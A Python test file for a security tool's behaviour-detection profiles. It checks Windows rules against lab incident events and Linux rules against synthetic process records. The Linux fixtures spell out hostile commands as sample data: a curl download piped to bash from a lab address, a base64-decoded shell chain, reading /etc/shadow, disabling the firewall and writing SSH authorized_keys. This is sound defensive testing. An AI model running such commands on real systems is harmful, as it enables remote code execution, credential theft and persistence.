"""
Detection profile tests.

Windows fixtures are real events exported from the lab during the
IR-002 through IR-005 investigations (raw-events/ under each report).
Linux fixtures are ECS-shaped documents in the exact format Elastic
Defend produces for the listed techniques.
"""
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "lynx"))

from behavior_detector import DETECTION_PROFILES, match_profile  # noqa: E402
from behavior_detector import match_linux_profile  # noqa: E402
from linux_profiles import LINUX_PROFILES  # noqa: E402

REPORTS = ROOT / "investigation-reports"


def load_real_event(path, event_id=None):
    """Load a raw-events export. Files hold either concatenated ES hit
    objects or a {"hits": {...}} envelope; when event_id is given, return
    the hit with that code."""
    text = (REPORTS / path).read_text()
    dec = json.JSONDecoder()
    i = 0
    candidates = []
    while i < len(text):
        while i < len(text) and text[i] in " \n\t\r":
            i += 1
        if i >= len(text):
            break
        obj, i = dec.raw_decode(text, i)
        if "hits" in obj and isinstance(obj.get("hits"), dict):
            candidates.extend(obj["hits"].get("hits", []))
        elif "_source" in obj:
            candidates.append(obj)
    for hit in candidates:
        src = hit["_source"]
        if event_id is None or int(src.get("winlog", {}).get("event_id", -1)) == event_id:
            return src
    raise ValueError(f"no event with code {event_id} in {path}")


def eid_of(src):
    return int(src["winlog"]["event_id"])


# --- Windows: real events from the lab -------------------------------

def test_encoded_powershell_fires_execution_profile():
    src = load_real_event("IR-003/raw-events/IR-003-EDR-encoded-powershell-raw-event.json")
    assert eid_of(src) == 1
    matched, reasons = match_profile(DETECTION_PROFILES["powershell_encoded_exec"], src, 1)
    assert matched, reasons
    assert any("-enc" in r for r in reasons)


def test_recon_whoami_fires_discovery_profile():
    src = load_real_event("IR-002/raw-events/IR-002-EDR-recon-eid1-raw-event.json")
    assert eid_of(src) == 1
    matched, _ = match_profile(DETECTION_PROFILES["whoami_execution"], src, 1)
    assert matched


def test_mshta_local_file_does_not_fire_remote_script_profile():
    # Documented in IR-004: a local .hta has a lower detection profile.
    src = load_real_event("IR-004/raw-events/IR-004-EDR-mshta-eid1-raw-event.json")
    assert eid_of(src) == 1
    matched, _ = match_profile(DETECTION_PROFILES["mshta_remote_script"], src, 1)
    assert not matched


def test_mshta_child_cmd_fires_shell_profile():
    src = load_real_event("IR-004/raw-events/IR-004-EDR-mshta-parentchild-raw-event.json", event_id=1)
    assert eid_of(src) == 1
    matched, _ = match_profile(DETECTION_PROFILES["cmd_shell_execution"], src, 1)
    assert matched


def test_runkey_write_fires_persistence_profile():
    src = load_real_event("IR-004/raw-events/IR-004-EDR-runkey-eid13-real-event.json", event_id=13)
    assert eid_of(src) == 13
    matched, _ = match_profile(DETECTION_PROFILES["registry_run_key_write"], src, 13)
    assert matched


def test_defender_registry_write_is_uncovered():
    # Documented gap: the tamper attempt leaves no matching profile.
    src = load_real_event("IR-004/raw-events/IR-004-EDR-defender-tamper-eid13-raw-event.json")
    assert eid_of(src) == 13
    any_match = any(
        match_profile(p, src, 13)[0] for p in DETECTION_PROFILES.values()
        if 13 in p.get("event_codes", [])
    )
    assert not any_match


# --- Linux: ECS documents in Elastic Defend format --------------------

def _ecs_process(name, args):
    return {
        "event": {"action": "exec"},
        "process": {"name": name, "args": args},
        "host": {"name": "web01"},
        "@timestamp": "2026-05-16T07:15:00Z",
    }


def test_linux_bash_and_base64_chain():
    src = _ecs_process("bash", ["-c", "echo d2hvYW1p | base64 -d | sh"])
    assert match_linux_profile(LINUX_PROFILES["linux_bash_shell"], src)[0]
    assert match_linux_profile(LINUX_PROFILES["linux_base64_decode"], src)[0]


def test_linux_curl_pipe_to_bash():
    src = _ecs_process("curl", ["-s", "http://10.0.30.10:8080/payload", "|", "bash"])
    assert match_linux_profile(LINUX_PROFILES["linux_curl_bash_pipe"], src)[0]


def test_linux_crontab_edit():
    src = _ecs_process("crontab", ["-e"])
    assert match_linux_profile(LINUX_PROFILES["linux_crontab_edit"], src)[0]


def test_linux_shadow_read():
    src = _ecs_process("cat", ["/etc/shadow"])
    assert match_linux_profile(LINUX_PROFILES["linux_shadow_read"], src)[0]


def test_linux_firewall_disable():
    src = _ecs_process("ufw", ["disable"])
    assert match_linux_profile(LINUX_PROFILES["linux_firewall_disable"], src)[0]


def test_linux_authorized_keys_write():
    src = {
        "event": {"action": "modification"},
        "file": {"path": "/home/victim/.ssh/authorized_keys"},
        "process": {"name": "sh"},
        "host": {"name": "web01"},
        "@timestamp": "2026-05-16T07:20:00Z",
    }
    assert match_linux_profile(LINUX_PROFILES["linux_authorized_keys_write"], src)[0]


def test_linux_benign_ls_does_not_fire():
    src = _ecs_process("ls", ["-la", "/home/victim"])
    any_match = any(match_linux_profile(p, src)[0] for p in LINUX_PROFILES.values())
    assert not any_match
